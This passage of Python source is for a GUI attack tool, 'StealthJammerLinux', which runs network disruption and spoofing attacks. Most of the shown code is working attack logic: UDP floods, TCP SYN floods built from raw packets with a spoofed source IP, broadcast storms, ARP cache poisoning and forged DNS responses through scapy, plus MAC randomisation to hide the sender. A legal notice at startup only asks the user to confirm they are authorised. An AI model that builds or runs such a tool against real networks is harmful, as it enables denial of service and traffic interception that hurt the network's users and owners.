            # Store packet with metadata
            self.preloaded_packets.append({
                'data': packet_data,
                'size': size,
                'target': f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}",
                'port': random.randint(1, 65535)
            })
            
            # Update status every 100 packets
            if (i + 1) % 100 == 0:
                self.after(0, lambda count=i+1: self.preload_status.config(
                    text=f"Packets ready: {count}/{self.preload_count}"))
        
        total_bytes = sum(p['size'] for p in self.preloaded_packets)
        self.after(0, lambda: self.preload_status.config(
            text=f"Packets ready: {len(self.preloaded_packets)} ({self.format_bytes(total_bytes)})",
            foreground=self.success_color))
        self.after(0, lambda: self.log_message(
            f"Preloaded {len(self.preloaded_packets)} packets ({self.format_bytes(total_bytes)})", "INFO"))
    
    def detect_network_interface(self):
        """Detect active network interface on Linux"""
        try:
            result = subprocess.run(['ip', 'route', 'get', '1'],
                                  capture_output=True, text=True, timeout=2)
            
            if_match = re.search(r'dev (\S+)', result.stdout)
            if if_match:
                self.current_interface = if_match.group(1)
                self.get_current_mac()
                self.generate_spoofed_identifiers()
                self.update_network_display()
        except Exception as e:
            print(f"Error detecting interface: {e}")
            self.current_interface = "Unknown"
            self.generate_spoofed_identifiers()
    
    def get_current_mac(self):
        """Get current MAC address on Linux"""
        if not self.current_interface:
            return
        try:
            with open(f'/sys/class/net/{self.current_interface}/address', 'r') as f:
                self.current_mac = f.read().strip()
                if not self.original_mac:
                    self.original_mac = self.current_mac
        except:
            pass
    
    def generate_random_mac(self):
        """Generate random MAC address"""
        mac = [0x02,
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join([f'{x:02x}' for x in mac])
    
    def generate_spoofed_identifiers(self):
        """Generate spoofed IP and MAC for packets"""
        self.spoofed_ip = f"{random.randint(10, 200)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        self.spoofed_mac = self.generate_random_mac()
        self.after(0, self.update_spoof_display)
    
    def update_network_display(self):
        """Update network info display"""
        if self.current_interface:
            self.network_label.config(text=f"Interface: {self.current_interface}")
            self.mac_status.config(text=f"Current MAC: {self.current_mac or 'Unknown'}")
    
    def update_spoof_display(self):
        """Update spoofing info display"""
        self.spoof_status.config(text=f"Spoofed IP: {self.spoofed_ip} | MAC: {self.spoofed_mac}")
    
    def on_mac_toggle(self):
        """Handle MAC randomization toggle"""
        self.mac_randomization = self.mac_var.get()
    
    def on_randomize_mac_now(self):
        """Randomize MAC address on Linux"""
        if not self.is_root:
            messagebox.showerror("Root Required",
                               "This feature requires root privileges.\n\n"
                               "Please run this program with sudo.")
            return
        
        new_mac = self.generate_random_mac()
        
        response = messagebox.askyesno("Change MAC Address?",
            f"This will temporarily disconnect you from the network.\n\n"
            f"Interface: {self.current_interface}\n"
            f"Current MAC: {self.current_mac}\n"
            f"New MAC: {new_mac}\n\n"
            f"This requires root privileges.")
        
        if response:
            threading.Thread(target=self.change_mac_address, args=(new_mac,), daemon=True).start()
    
    def change_mac_address(self, new_mac):
        """Change MAC address on Linux"""
        try:
            subprocess.run(['ip', 'link', 'set', self.current_interface, 'down'], check=True, timeout=10)
            subprocess.run(['ip', 'link', 'set', self.current_interface, 'address', new_mac], check=True, timeout=10)
            subprocess.run(['ip', 'link', 'set', self.current_interface, 'up'], check=True, timeout=10)
            
            self.current_mac = new_mac
            self.after(0, self.update_network_display)
            self.after(0, lambda: self.log_message(f"MAC address changed to {new_mac}", "INFO"))
            self.after(0, lambda: messagebox.showinfo(
                "MAC Address Changed",
                f"Successfully changed to {new_mac}\n\nReconnecting to network..."
            ))
        except Exception as e:
            self.after(0, lambda: self.log_message(f"MAC change failed: {str(e)}", "ERROR"))
            self.after(0, lambda: messagebox.showerror(
                "MAC Change Failed",
                f"Error: {str(e)}\n\nMake sure you have root privileges."
            ))
    
    def on_obfuscation_toggle(self):
        """Handle traffic obfuscation toggle"""
        self.traffic_obfuscation = self.obfus_var.get()
    
    def on_raw_socket_toggle(self):
        """Handle raw socket toggle"""
        self.raw_socket_enabled = self.raw_socket_var.get()
        status = "enabled" if self.raw_socket_enabled else "disabled"
        self.log_message(f"Raw socket support {status}", "INFO")
    
    def on_scapy_toggle(self):
        """Handle scapy toggle"""
        self.use_scapy = self.scapy_var.get()
        status = "enabled" if self.use_scapy else "disabled"
        self.log_message(f"Scapy packet crafting {status}", "INFO")
    
    def on_arp_toggle(self):
        """Handle ARP poisoning toggle"""
        self.arp_poison_enabled = self.arp_var.get()
        status = "enabled" if self.arp_poison_enabled else "disabled"
        self.log_message(f"ARP cache poisoning {status}", "ATTACK" if self.arp_poison_enabled else "INFO")
    
    def on_dns_toggle(self):
        """Handle DNS spoofing toggle"""
        self.dns_spoof_enabled = self.dns_var.get()
        status = "enabled" if self.dns_spoof_enabled else "disabled"
        self.log_message(f"DNS response spoofing {status}", "ATTACK" if self.dns_spoof_enabled else "INFO")
    
    def on_syn_raw_toggle(self):
        """Handle raw SYN flood toggle"""
        self.syn_flood_raw = self.syn_raw_var.get()
        status = "enabled" if self.syn_flood_raw else "disabled"
        self.log_message(f"Raw SYN flood {status}", "INFO")
    
    def on_preset_click(self, level):
        """Handle preset intensity clicks"""
        self.intensity_var.set(level)
        self.on_intensity_changed(None)
    
    def on_intensity_changed(self, event):
        """Handle intensity slider change"""
        self.intensity = int(self.intensity_var.get())
        percent = self.intensity * 10
        self.intensity_label.config(text=f"Level {self.intensity} ({percent}%)")
    
    def on_attack_toggle(self):
        """Toggle attack on/off"""
        if not self.attack_active:
            self.start_attack()
        else:
            self.stop_attack()
    
    def start_attack(self):
        """Start the attack"""
        self.attack_active = True
        self.start_time = time.time()
        self.packets_sent = 0
        self.bytes_sent = 0
        self.last_packet_count = 0
        self.last_byte_count = 0
        self.last_update_time = time.time()
        
        self.attack_button.config(text="[X] TERMINATE ATTACK", bg='#330000')
        self.status_label.config(text="ATTACKING", foreground=self.danger_color)
        
        self.log_message("=" * 50, "ATTACK")
        self.log_message("ATTACK INITIATED", "ATTACK")
        self.log_message(f"Intensity level: {self.intensity}/10", "ATTACK")
        self.log_message(f"Packet size: {self.packet_size_min}-{self.packet_size_max} bytes", "ATTACK")
        self.log_message(f"Send rate: {self.send_rate} pps/thread", "ATTACK")
        self.log_message(f"Burst size: {self.burst_size} packets", "ATTACK")
        
        self.generate_spoofed_identifiers()
        
        # Preload packets if enabled and not already loaded
        if self.preload_enabled and len(self.preloaded_packets) == 0:
            self.log_message("Auto-preloading packets for attack...", "INFO")
            self._preload_packets_thread()
        
        num_threads = self.intensity * self.thread_multiplier
        
        active_vectors = []
        if self.vector_udp_var.get():
            active_vectors.append("UDP Flood")
            for _ in range(num_threads):
                t = threading.Thread(target=self.udp_flood_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_tcp_var.get():
            active_vectors.append("TCP SYN Flood")
            for _ in range(num_threads):
                if self.syn_flood_raw and self.is_root:
                    t = threading.Thread(target=self.tcp_syn_raw_attack, daemon=True)
                else:
                    t = threading.Thread(target=self.tcp_syn_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_broadcast_var.get():
            active_vectors.append("Broadcast Storm")
            for _ in range(num_threads):
                t = threading.Thread(target=self.broadcast_storm_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        # Linux-specific attack vectors
        if self.arp_poison_enabled and self.is_root and self.scapy_available:
            active_vectors.append("ARP Poisoning")
            t = threading.Thread(target=self.arp_poison_attack, daemon=True)
            t.start()
            self.attack_threads.append(t)
        
        if self.dns_spoof_enabled and self.is_root and self.scapy_available:
            active_vectors.append("DNS Spoofing")
            t = threading.Thread(target=self.dns_spoof_attack, daemon=True)
            t.start()
            self.attack_threads.append(t)
        
        self.log_message(f"Vectors: {', '.join(active_vectors)}", "ATTACK")
        self.log_message(f"Spawned {len(self.attack_threads)} attack threads", "ATTACK")
        self.log_message(f"Target throughput: {num_threads * self.send_rate:,} pps", "ATTACK")
        self.log_message("=" * 50, "ATTACK")
    
    def stop_attack(self):
        """Stop the attack"""
        self.attack_active = False
        
        self.attack_button.config(text="[>] INITIATE ATTACK", bg='#003300')
        self.status_label.config(text="Idle", foreground=self.warning_color)
        
        self.log_message("=" * 50, "WARNING")
        self.log_message("ATTACK TERMINATED", "WARNING")
        self.log_message(f"Total packets sent: {self.packets_sent:,}", "INFO")
        self.log_message(f"Total data sent: {self.format_bytes(self.bytes_sent)}", "INFO")
        self.log_message("=" * 50, "WARNING")
        
        self.attack_threads = []
    
    def udp_flood_attack(self):
        """UDP flood with preloaded packets"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
            
            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
            preload_index = 0
            
            while self.attack_active:
                try:
                    for _ in range(self.burst_size):
                        if self.preload_enabled and len(self.preloaded_packets) > 0:
                            packet = self.preloaded_packets[preload_index % len(self.preloaded_packets)]
                            sock.sendto(packet['data'], (packet['target'], packet['port']))
                            size = packet['size']
                            preload_index += 1
                        else:
                            port = random.randint(1, 65535)
                            size = random.randint(self.packet_size_min, self.packet_size_max)
                            target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                            
                            payload = bytes(random.getrandbits(8) for _ in range(size))
                            sock.sendto(payload, (target, port))
                        
                        self.packets_sent += 1
                        self.bytes_sent += size
                    
                    if delay_per_burst > 0:
                        time.sleep(delay_per_burst)
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def tcp_syn_attack(self):
        """TCP SYN flood"""
        try:
            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
            
            while self.attack_active:
                try:
                    for _ in range(self.burst_size):
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.01)
                        
                        port = random.randint(1, 65535)
                        target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                        
                        try:
                            sock.connect((target, port))
                        except:
                            pass
                        
                        sock.close()
                        self.packets_sent += 1
                        self.bytes_sent += 60
                    
                    if delay_per_burst > 0:
                        time.sleep(delay_per_burst)
                except:
                    pass
        except:
            pass
    
    def tcp_syn_raw_attack(self):
        """Raw TCP SYN flood using raw sockets (Linux only, requires root)"""
        try:
            if not self.is_root:
                return
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
            
            while self.attack_active:
                try:
                    for _ in range(self.burst_size):
                        target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                        port = random.randint(1, 65535)
                        
                        # Craft TCP SYN packet
                        packet = self.craft_tcp_syn(self.spoofed_ip, target, random.randint(1024, 65535), port)
                        sock.sendto(packet, (target, 0))
                        
                        self.packets_sent += 1
                        self.bytes_sent += len(packet)
                    
                    if delay_per_burst > 0:
                        time.sleep(delay_per_burst)
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def craft_tcp_syn(self, src_ip, dst_ip, src_port, dst_port):
        """Craft raw TCP SYN packet"""
        # IP header fields
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        # TCP header fields
        tcp_source = src_port
        tcp_dest = dst_port
        tcp_seq = random.randint(0, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5
        
        # TCP flags
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        
        # Pack headers
        ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                               ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
        
        tcp_header = struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                                tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
        
        return ip_header + tcp_header
    
    def broadcast_storm_attack(self):
        """Broadcast storm"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
            
            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
            preload_index = 0
            
            while self.attack_active:
                try:
                    for _ in range(self.burst_size):
                        if self.preload_enabled and len(self.preloaded_packets) > 0:
                            packet = self.preloaded_packets[preload_index % len(self.preloaded_packets)]
                            sock.sendto(packet['data'], ("255.255.255.255", packet['port']))
                            size = packet['size']
                            preload_index += 1
                        else:
                            size = random.randint(self.packet_size_min, self.packet_size_max)
                            payload = bytes(random.getrandbits(8) for _ in range(size))
                            port = random.randint(1, 65535)
                            sock.sendto(payload, ("255.255.255.255", port))
                        
                        self.packets_sent += 1
                        self.bytes_sent += size
                    
                    if delay_per_burst > 0:
                        time.sleep(delay_per_burst)
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def arp_poison_attack(self):
        """ARP cache poisoning attack (requires scapy and root)"""
        try:
            if not self.scapy_available or not self.is_root:
                return
            
            from scapy.all import ARP, send
            
            while self.attack_active:
                try:
                    # Target random IPs in local subnet
                    target_ip = f"192.168.1.{random.randint(1, 254)}"
                    gateway_ip = "192.168.1.1"  # Common gateway
                    
                    # Craft ARP packets
                    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                                psrc=gateway_ip, hwsrc=self.spoofed_mac)
                    
                    send(packet, verbose=False)
                    self.packets_sent += 1
                    self.bytes_sent += 42  # ARP packet size
                    
                    time.sleep(0.1)  # Don't spam too fast
                except:
                    pass
        except:
            pass
    
    def dns_spoof_attack(self):
        """DNS spoofing attack (requires scapy and root)"""
        try:
            if not self.scapy_available or not self.is_root:
                return
            
            from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
            
            while self.attack_active:
                try:
                    # Spoof DNS responses
                    target_ip = f"192.168.1.{random.randint(1, 254)}"
                    
                    # Craft DNS response
                    dns_response = IP(dst=target_ip, src="8.8.8.8") / \
                                  UDP(dport=random.randint(1024, 65535), sport=53) / \
                                  DNS(qr=1, qd=DNSQR(qname="example.com"), 
                                     an=DNSRR(rrname="example.com", rdata=self.spoofed_ip))
                    
                    send(dns_response, verbose=False)
                    self.packets_sent += 1
                    self.bytes_sent += len(bytes(dns_response))
                    
                    time.sleep(0.1)
                except:
                    pass
        except:
            pass
    
    def update_stats(self):
        """Update statistics display"""
        if self.attack_active:
            duration = int(time.time() - self.start_time)
            
            current_time = time.time()
            time_diff = current_time - self.last_update_time
            
            if time_diff >= 1.0:
                packet_diff = self.packets_sent - self.last_packet_count
                byte_diff = self.bytes_sent - self.last_byte_count
                
                self.current_pps = int(packet_diff / time_diff)
                self.current_bandwidth = int(byte_diff / time_diff)
                
                self.last_packet_count = self.packets_sent
                self.last_byte_count = self.bytes_sent
                self.last_update_time = current_time
            
            self.packets_label.config(text=f"{self.packets_sent:,}")
            self.time_label.config(text=f"{duration}s")
            self.rate_label.config(text=f"{self.current_pps:,} pps")
            self.bandwidth_label.config(text=f"{self.format_bytes(self.current_bandwidth)}/s")
            self.data_label.config(text=self.format_bytes(self.bytes_sent))
            self.threads_label.config(text=f"{len(self.attack_threads)}")
        
        # Update ping
        if self.current_ping >= 0:
            if self.current_ping == 0:
                self.ping_label.config(text="<1 ms", foreground=self.success_color)
            elif self.current_ping < 50:
                self.ping_label.config(text=f"{self.current_ping} ms", foreground=self.success_color)
            elif self.current_ping < 100:
                self.ping_label.config(text=f"{self.current_ping} ms", foreground=self.warning_color)
            else:
                self.ping_label.config(text=f"{self.current_ping} ms", foreground=self.danger_color)
        else:
            self.ping_label.config(text="Timeout", foreground=self.danger_color)
        
        self.after(200, self.update_stats)
    
    def on_destroy(self):
        """Cleanup on exit"""
        self.attack_active = False
        self.ping_monitoring = False
        
        # Restore original MAC if changed
        if self.original_mac and self.current_mac != self.original_mac and self.current_interface and self.is_root:
            try:
                subprocess.run(['ip', 'link', 'set', self.current_interface, 'down'], timeout=5)
                subprocess.run(['ip', 'link', 'set', self.current_interface, 'address', self.original_mac], timeout=5)
                subprocess.run(['ip', 'link', 'set', self.current_interface, 'up'], timeout=5)
            except:
                pass
        
        self.log_message("System shutdown initiated", "WARNING")
        self.destroy()

if __name__ == "__main__":
    # Show warning on startup
    root = tk.Tk()
    root.withdraw()
    
    response = messagebox.askyesno(
        "WARNING - Legal Notice",
        "This tool is designed for authorized security testing only.\n\n"
        "Unauthorized network attacks are ILLEGAL and may result in:\n"
        "• Criminal prosecution\n"
        "• Civil liability\n"
        "• Network disruption\n\n"
        "By clicking 'Yes', you confirm:\n"
        "1. You have explicit authorization to test this network\n"
        "2. You understand the legal implications\n"
        "3. You accept full responsibility for your actions\n\n"
        "Do you wish to continue?",
        icon='warning'
    )
    
    root.destroy()
    
    if response:
        app = StealthJammerLinux()
        app.mainloop()
    else:
        sys.exit(0)
